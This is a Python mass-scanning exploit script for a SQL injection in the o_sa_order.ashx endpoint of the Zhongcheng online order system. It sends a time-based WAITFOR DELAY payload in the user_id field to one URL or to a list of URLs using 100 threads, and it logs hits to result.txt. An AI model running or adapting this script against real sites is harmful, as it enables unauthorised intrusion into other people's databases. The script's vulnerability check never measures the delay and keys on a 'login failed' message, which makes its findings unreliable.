import requests,argparse,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
    test = """众诚网上订单系统o_sa_order.ashx存在SQL注入漏洞"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="众诚网上订单系统o_sa_order.ashx存在SQL注入漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = '/ajax/o_sa_order.ashx'
    headers = {
        "User-Agent": "Mozilla/5.0(Windows NT 10.0;Win64;x64;rv:129.0)Gecko/20100101 Firefox/129.0",
        "Accept": "*/*",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Priority": "u=0"
    }
    data = 'type=login&user_id=1%27);WAITFOR%20DELAY%20%270:0:5%27--&user_pwd=1'
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers, data=data,timeout=10, verify=False,proxies=proxies)
        if '登陆失败' in res1.text:
            print(f"[+]该url:{target}存在sql注入漏洞")
            with open('result.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在sql注入漏洞')
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()